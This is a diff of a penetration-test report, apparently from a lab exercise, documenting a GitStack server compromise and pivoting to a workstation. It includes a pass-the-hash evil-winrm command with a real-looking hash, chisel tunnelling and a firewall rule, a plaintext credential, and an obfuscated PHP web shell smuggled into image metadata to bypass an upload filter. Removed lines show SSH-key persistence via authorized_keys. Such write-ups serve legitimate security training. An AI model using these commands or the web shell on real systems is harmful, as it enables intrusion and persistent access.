@@ -156,7 +156,7 @@ This error message provides information about existing paths withing this site. 
 **Recommendation**
 Error messages should not disclose sensitive or internal information referred to the server or systems. Those messages should bbe focused on how to solve the error. By providing internal information, the application creates an attacking surface that may be exploited by malicious users.
 
-## 4- Remote command execution on the GitStack server
+## 6- Remote command execution on the GitStack server
 **Severity**
 High
 **Description**
@@ -202,6 +202,24 @@ The exploit create a backdook in PHP which allows an attacker to execute command
 **Recommendation**
 It is recommended to patch services to the latest version to avoid the exploit of known vulnerabilities.
 
+## 7- Bypass of file uploaded filter
+**Severity**
+High
+**Description**
+After gaining access to the webserver in **10.200.105.100**, the url **http://10.200.105.100/resources** allows us to upload files:
+![Login paged found in http://10.200.105.100/resources](image-12.png)
+
+ The analyse of the commits of the git server, showed that there two filter in place:
+- extension: jpg, png, jpeg and gif
+  OR
+- if metadata contains information related to a image
+
+If one of this filters is accepted, the file can be uploaded. The first filter can be bypassed by adding double extension. The screenshot below shows the upload of a PHP file, extension no allowed:
+![Filter to upload files bypassed](image-13.png)
+
+
+**Recommendation**
+It is recommended to implement several filters that verify if the uploaded file matches the one expected by the application. Besides the extension, it is possible to check the file signature (a.k.a magic number), content-type and verify is no extra extensions has been added.
 # Narrative
 
 ## Service Enumeration
@@ -379,7 +397,7 @@ PORT     STATE SERVICE
 
 The process of pivoting will be conclude once the first server can be used to access the other hosts in the network. To achieve this result, we used the tool *sshuttle*, which stablishes a connection to the comprimised server and allows the communication to the other hosts. The executed command is shown below:
 ```
-sshuttle -r root@10.200.105.200 --ssh-cmd "ssh -i id_rsa" 10.200.0.0/24 -x 10.200.105.200
+sshuttle -r root@10.200.105.200 --ssh-cmd "ssh -i id_rsa" 10.200.105.200/24 -x 10.200.105.200
 ``` 
 
 Now, we access in through the browser the service running on **http://10.200.105.150/**:
@@ -491,27 +509,96 @@ Even without founding the password of the Administrator, it is still possible to
 evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.105.150
 ```
 
+## Enumerating personal computer 
+The GitStack server hosted on 10.200.105.150 is on the same network as the personal computer (10.200.105.100). With our access, it is possible to upload files on 10.200.105.150 that allows the connection to the PC. To gather more informatation about this system, we upload, using evil-win a powershell script that performs a network scanner. With this scanner we aim to find what ports a open on this system:
+
+```
+# Upload the port scanner
+evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.105.150 -s /home/bruno/Downloads/tools/Enumeration/Windows/   
+
+# Running the port scanner on the top 50 ports
+Invoke-Portscan -Hosts 10.200.105.100 -TopPorts 1000
+```
+
+This command showed us that the PC has the following ports openned:
+```
+Hostname      : 10.200.105.100
+alive         : True
+openPorts     : {80, 3389}
+```
+
+With the tool *chisel*, we can pivot the GitStack server to get access to the PC. We execute the following commands to pivoting:
+```
+# Open a firewall port on the GitStack system
+netsh advfirewall firewall add rule name="Chisel-Pat2" dir=in action=allow protocol=tcp localport=56001
+
+# on the machine that will be used as pivot, we ran start chisel as server:
+./chisel_1.9.1_windows_amd64.exe server -p 56001 --socks5
+
+# on our attacking machine, we start a chisel client
+./chisel_1.9.1_linux_amd64 client 10.200.105.150:56001 6007:socks
+```
+
+By starting the commands above, it is possible to use our attacking machine to access the content of the PC:
+![Access to port 80 of the PC](image-9.png)
+
+Our connection can be explained in the diagram below below:
+![Connection Diagram](image-10.png)
 
 
-676     {0;000003e7} 1 D 20119          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
- -> Impersonated !
- * Process Token : {0;0014b5a9} 2 F 2300470     GIT-SERV\patota S-1-5-21-3335744492-1614955177-2693036043-1002  (15g,24p)       Primary
- * Thread Token  : {0;000003e7} 1 D 2347380     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
+## Exploring the git repository
+The PC contains a copy of the website. The friend uses this PC to develope and then push the elements to the repository. We used this knowledge to extract the content of the git repository. We use [Git Tools](https://github.com/internetwache/GitTools) to explore the content of the resository. 
+
+With the following script, we could rebuild the commits of the repository:
+```
+~/git/GitTools/Extractor/extractor.sh . MyRepo
+```
+
+There are three commits:
+![Three commits](image-11.png)
+
+By analyzing those commits, we found a file called *index.php*.  This .php codes gives information about file upload into the website and gives a path where the file is upload. The code checks the following elements about the uploaded file:
+- extension: jpg, png, jpeg and gif
+- Content of metadata about size of the picture 
+
+## Exploiting the PC
+The website behind **10.200.105.100** gave us two paths:
+- /upload/: where uploaded files are being saved
+- /resources/: takes us to a login page:
+![Login paged found in http://10.200.105.100/resources](image-12.png)
 
 
+With all information that we have gatheres so far, we can assume that the username is either *thomas* or *wreath*. From the previous passwords extracted and documented in this report, we found the following combination:
+```
+Thomas:i<3ruby
+```
+Before attempting to upload an malicious code, we wanted to get a Proof of Concept (PoC) that the server is vulnerable. We edited the metadata a file and added a second extension to it:
+```
+# Original file
+teste.png
+
+# Modified
+teste.png.php
+
+# added payload in the metadata
+exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" test-pat.jpeg.php
+```
+
+Usin this methodology, we were able to upload a PoC that the filter can be bypassed:
+![Filter to upload files bypassed](image-13.png)
 
 
-chattr -i authorized_keys
-cat screamz_rsa.pub >> authorized_keys
-chattr +i authorized_keys
+Once we got the PoC, our next step is to upload a file that will bypass the AV and execute command remotly. We uploaded the following PHP in the metadata of the PNG file:
+```
+exiftool -Comment="<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>" test-path2.png.php
+```
 
-echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDaKVJ8cS6PMHToSo8yhJhACSILA8/P134PByQz7CFR8XsP/+MJvOpmP2FWdCgqk0nGUPeGb95LHboLCxB++nmBc4IB1YuVlKg582TqHXZkxpfX6pRVorv5ZUuE8huWxvONq69k1SW4yYf6RGFMfP5GejEhfTShnmx6Jo1Qaw8MbGGhwdawrtcvUT4AjDj7H5gFFTWj9qZ2APndYw0N6IdSzzm0yWQ/wNzl3AKIOrofj/0R3hm1Dc0MiLGRSDtF4ykaqHdB8wIgqUPVLHX0dtv7rHkW4G6cghYlbzqEYvdchwQnZMCtE9cyzY+PsxL3ZUeQueTMgRKHOKBouvNwIYlGfBwOmWrdqm2vNngHyE/978JCvstJ8QShkWlfFDnK/+bCaugSBD6azecTsd52TfMenb3d0Ji68vSdWmoQoy2ZN0SlscxiF/aTw/odVCWyk4ZO3QR6mF5OHbGwQNpvDktnj6enGMbSYysmGTLrxb4dBRIBmQ9jIJrlH51xrGhBWc0= patota" >> authorized_keys2
+After the successfull upload, we can execute commands on the PC:
+![Command: hostname](image-14.png)
+and
+![Command: hostname](image-15.png)
 
-
-echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzSgdiWcVQdOVu6F49M2ghOS7g4Efw7HNE3w7e0yukeo0fcsdpBEQuAB72qT129ADuklv1Xq98tz5WbpcsLUlj0uOi7z0J3gBxMn06u5hldMOdfSFbW87kOjVtKOQMMh+ims7fv9iQMrE8Wp0hhbRSTMDrSrOQwfLufeQuFpvuCRXrnAd0jAj+/z5IpeVV56DT4vXYGRxJjNXJVR8Tp1jHHcHAlK7w8jMs79dRdew4a5FGejR0bddIV1vKJ6EZCVEgYQzPGF2FZBGvLYeUx7sDl2Zb/hqDyj406EGrKA+WvEUp1AyDqst/zKitpbiZtjusDv9OJYGLqNF+oXOB4vpbSFEC+9DOw9y0Ar5kbIZhZdripHhUgRadidQeMCiw9Iuf6jxDqq015lQx5XDMof2uMUbe2eN9li8c7rp3KlpEAXgZ9yFC6yJuEkT6+Uqco2lncK2BCx2Rrqg52775zUz75mPPXgMmib38JYOm+dKNFFVNTVDvD/UyeJIdkyNzMis= root@tm-prod-serv" >> authorized_keys
-
-
-sshuttle -r root@10.200.105.200 --ssh-cmd "ssh -i id_rsa" 10.200.0.0/24 -x 10.200.105.200
+### Creating Reverse Shell on the PC
 
 
 ## Maintaining Access
